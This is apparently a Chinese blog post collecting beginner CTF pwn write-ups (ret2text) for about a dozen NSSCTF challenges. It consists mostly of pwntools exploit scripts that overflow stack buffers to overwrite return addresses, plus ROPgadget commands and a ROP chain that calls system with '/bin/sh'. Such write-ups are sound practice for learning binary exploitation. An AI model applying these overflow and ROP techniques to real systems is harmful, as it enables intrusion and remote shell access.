---
title: PWN入门-ret2text做题
date: 2024-01-26 22:32:43
tags: PWN
mathjax: true
---

# PWN入门-ret2text做题

## [SWPUCTF 2021 新生赛]gift_pwn

```bash
checksec 文件名
```

* 开启堆栈不可执行保护(NX)，不会把堆栈上数据当成指令来执行。

* 没有canary保护，可利用栈溢出来修改eip。

* PIE地址随机花没有开启。

```python
from pwn import *
p=remote('node4.anna.nssctf.cn',28708)
payload=b'a'*0x10+b'a'*8+p64(0x4005B6) #32位+4 64位+8
p.sendline(payload)
p.interactive()
```

## [CISCN 2019华北]PWN1

```python
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
p=process('./attachment')
payload=b'a'*0x2c+p64(0x41348000)
p.sendline(payload)
p.interactive()
```

## [BJDCTF 2020]babystack2.0

```python
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
p=remote('node4.anna.nssctf.cn',28830)
p.recvuntil("[+]Please input the length of your name:")
p.sendline(b'-1')
p.recvuntil("[+]What's u name?")
bin_sh=p64(0x400726)
payload=flat([b'a'*0x10,b'a'*8,bin_sh])
p.sendline(payload)
p.interactive()
```

## [BJDCTF 2020]babystack

```python
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
p=remote('node4.anna.nssctf.cn',28487)
p.recvuntil("[+]Please input the length of your name:")
p.sendline(b'999')
p.recvuntil("[+]What's u name?")
bin_sh=p64(0x4006E6)
payload=flat([b'a'*0x10,b'a'*8,bin_sh])
p.sendline(payload)
p.interactive()
```

## [NISACTF 2022]ezstack

```python
from pwn import *
context(log_level='debug',arch='i386',os='linux')
p=remote('node5.anna.nssctf.cn',28073)
p.recvuntil("Welcome to NISACTF")
system_addr=p32(0x8048512)
bin_sh_addr=p32(0x804a024)
payload=flat([b'a'*0x48,b'a'*4,system_addr,bin_sh_addr])
p.sendline(payload)
p.interactive()
```

## [watevrCTF 2019]Voting Machine 1

```python
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
p=remote('node5.anna.nssctf.cn',28446)
p.recvuntil('Vote: ')
backdoor_addr=p64(0x400807)
payload=flat([b'a'*0x2,b'a'*8,backdoor_addr])
p.sendline(payload)
p.interactive()
```

## [GFCTF 2021]where_is_shell

“/bin/sh”等同于“sh”等同于“\$0”，“\$0”为0x2430，正好tips函数中有个花指令可以利用。

构造rop链：

栈对齐随便打一个ret:

```bash
ROPgadget --binary shell --only "ret"
```

system由rdi传参，找pop_rdi_ret型gadget：

```bash
ROPgadget --binary shell --only "pop|ret"
```

将\$0地址压栈，再从plt劫持system地址打。

```python
from pwn import *
import struct
context(log_level='debug',arch='amd64',os='linux')
elf=ELF('./shell')
p=remote("node4.anna.nssctf.cn",28367)
p.recvuntil("zltt lost his shell, can you find it?")
ret_addr=p64(0x400416)
pop_rdi_ret_addr=p64(0x4005e3)
bin_sh_addr=p64(0x400541)
system_addr=p64(elf.plt["system"])
payload=flat([b'a'*0x10,b'a'*8,ret_addr,pop_rdi_ret_addr,bin_sh_addr,system_addr])
p.sendline(payload)
p.interactive()
```

## [HNCTF 2022 Week1]easyoverflow

略。

## [NSSCTF 2022 Spring Recruit]R3m4ke?

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p=remote('node4.anna.nssctf.cn',28510)
stack_overflow=cyclic(0x20+8)
shell_addr=p64(0x40072C)
payload1=flat([stack_overflow,shell_addr])
p.recvuntil("[+] Welcome to NSS , this is a very simple PWN question for getting started>")
p.sendline(payload1)
p.interactive()
```

## [WUSTCTF 2020]getshell

```python
from pwn import *
context(log_level='debug',os='linux',arch='i386')
p=remote("node5.anna.nssctf.cn",28644)
elf=ELF('./attachment')
stack_overflow=cyclic(0x18+4)
shell_addr=p32(elf.sym["shell"])
payload1=flat([stack_overflow,shell_addr])
p.sendline(payload1)
p.interactive()
```

## [HNCTF 2022 Week1]ezr0p32

32位函数传参都在栈上，不牵扯寄存器。栈溢出后直接打system，内部先pop出call压入的ebp，所以先填充一个双字的垃圾，栈里第二个位置开始即为传参。

```python
from pwn import *
context(log_level='debug',os='linux',arch='i386')
elf=ELF('./attachment')
p=remote("node5.anna.nssctf.cn",28745)
p.recvuntil("please tell me your name")
payload1=b'/bin/sh'
p.sendline(payload1)
p.recvuntil("now it's your play time~")
stack_overflow=b'a'*(0x1c+4)
system_addr=p32(elf.sym["system"])
skip_ebp=b'aaaa'
buf_addr=p32(elf.sym["buf"])
payload2=flat([stack_overflow,system_addr,skip_ebp,buf_addr])
p.sendline(payload2)
p.interactive()
```

## [SWPUCTF 2022 新生赛]有手就行的栈溢出

```python
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
elf=ELF('./attachment')
p=remote("node5.anna.nssctf.cn",28415)
stack_overflow=b'a'*(0x20+8)
fun_addr=p64(elf.sym["fun"])
payload1=flat([stack_overflow,fun_addr])
p.sendline(payload1)
p.interactive()
```
